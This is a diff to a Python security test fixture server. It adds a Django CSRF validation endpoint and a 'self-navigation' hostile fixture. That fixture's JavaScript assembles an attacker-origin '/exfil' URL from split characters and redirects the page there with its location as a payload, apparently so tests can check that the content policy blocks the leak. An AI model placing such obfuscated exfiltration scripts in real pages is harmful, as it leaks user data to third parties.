@@ -15,7 +15,9 @@ from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from threading import Lock, Thread
 from urllib.parse import urlsplit
 
-from django.http import HttpResponse
+from django.http import HttpRequest, HttpResponse
+from django.middleware.csrf import CsrfViewMiddleware, get_token
+from django.test import RequestFactory
 
 from agora.rendering.security import (
     apply_content_response_policy,
@@ -63,12 +65,10 @@ class _FixtureRequestHandler(BaseHTTPRequestHandler):
             body_length = min(int(content_length), 1_048_576)
         except ValueError:
             body_length = 0
-        if body_length:
-            self.rfile.read(body_length)
-        self._dispatch()
+        self._dispatch(body=self.rfile.read(body_length) if body_length else b"")
 
-    def _dispatch(self) -> None:
-        self.server.fixture.handle(self)
+    def _dispatch(self, *, body: bytes = b"") -> None:
+        self.server.fixture.handle(self, body=body)
 
     def log_message(self, format: str, *args: object) -> None:
         del format, args
@@ -125,7 +125,7 @@ class FixtureServer:
     def requests_for(self, path: str) -> tuple[RequestRecord, ...]:
         return tuple(request for request in self.requests() if request.path == path)
 
-    def handle(self, handler: _FixtureRequestHandler) -> None:
+    def handle(self, handler: _FixtureRequestHandler, *, body: bytes = b"") -> None:
         path = urlsplit(handler.path).path
         with self._request_lock:
             self._requests.append(
@@ -137,7 +137,11 @@ class FixtureServer:
             )
 
         if self.host == PORTAL_HOST:
-            response = self._portal_response(path)
+            response = (
+                self._csrf_response(handler, body=body)
+                if path == "/fixture/csrf"
+                else self._portal_response(path)
+            )
         elif self.host == CONTENT_HOST:
             response = self._content_response(path, origin=handler.headers.get("Origin"))
         else:
@@ -150,6 +154,27 @@ class FixtureServer:
         handler.end_headers()
         if handler.command != "HEAD" and response.content:
             handler.wfile.write(response.content)
+
+    def _csrf_response(self, handler: _FixtureRequestHandler, *, body: bytes) -> HttpResponse:
+        """Exercise real CSRF validation without accessing application data."""
+        headers = {
+            name: value
+            for name in ("Host", "Origin", "Referer", "Cookie")
+            if (value := handler.headers.get(name)) is not None
+        }
+        request = RequestFactory().generic(
+            handler.command,
+            handler.path,
+            data=body,
+            content_type="application/x-www-form-urlencoded",
+            headers=headers,
+        )
+        csrf = CsrfViewMiddleware(_csrf_form)
+        csrf.process_request(request)
+        rejection = csrf.process_view(request, _csrf_form, (), {})
+        response = rejection if rejection is not None else _csrf_form(request)
+        csrf.process_response(request, response)
+        return apply_portal_response_policy(response, content_origin=self.content_origin)
 
     def _portal_response(self, path: str) -> HttpResponse:
         if path == "/fixture/storage":
@@ -167,6 +192,8 @@ class FixtureServer:
             body = self._portal_page((("csv-content", "/fixture/csv"),))
         elif path == "/fixture/package":
             body = self._portal_page((("package-content", "/fixture/package"),))
+        elif path == "/fixture/self-navigation":
+            body = self._portal_page((("self-navigation", "/fixture/self-navigation"),))
         else:
             body = self._portal_page((("hostile-content", "/fixture/hostile"),))
         response = HttpResponse(body, content_type="text/html; charset=utf-8")
@@ -179,6 +206,8 @@ class FixtureServer:
         body: str | bytes
         if path == "/fixture/hostile":
             body = _hostile_fixture(self.attacker_origin)
+        elif path == "/fixture/self-navigation":
+            body = _self_navigation_fixture(self.attacker_origin)
         elif path == "/fixture/storage-a":
             body = _storage_fixture(self.attacker_origin, role="a")
         elif path == "/fixture/storage-b":
@@ -286,6 +315,18 @@ def _response_headers(response: HttpResponse) -> Iterator[tuple[str, str]]:
     yield from response.headers.items()
     for cookie in response.cookies.values():
         yield "Set-Cookie", cookie.OutputString()
+
+
+def _csrf_form(request: HttpRequest) -> HttpResponse:
+    if request.method == "POST":
+        return HttpResponse("<h1>Form accepted</h1>")
+    token = escape(get_token(request), quote=True)
+    return HttpResponse(
+        '<!doctype html><html lang="en"><title>CSRF fixture</title>'
+        '<form method="post">'
+        f'<input type="hidden" name="csrfmiddlewaretoken" value="{token}">'
+        '<button type="submit">Submit</button></form></html>'
+    )
 
 
 def _iframe_markup(*, frame_id: str, content_url: str, content_origin: str) -> str:
@@ -533,6 +574,21 @@ def _hostile_fixture(attacker_origin: str) -> str:
         output.dataset.results = JSON.stringify({{ fatal: String(error) }});
         document.body.dataset.ready = 'true';
       }});
+    </script>
+  </body>
+</html>
+"""
+
+
+def _self_navigation_fixture(attacker_origin: str) -> str:
+    target_parts = list(attacker_origin + "/exfil/self-navigation")
+    return f"""<!doctype html>
+<html lang="en">
+  <head><meta charset="utf-8"><title>Self-navigation fixture</title></head>
+  <body>
+    <script>
+      const destination = {json.dumps(target_parts)}.join('');
+      location.href = destination + '?payload=' + encodeURIComponent(location.href);
     </script>
   </body>
 </html>
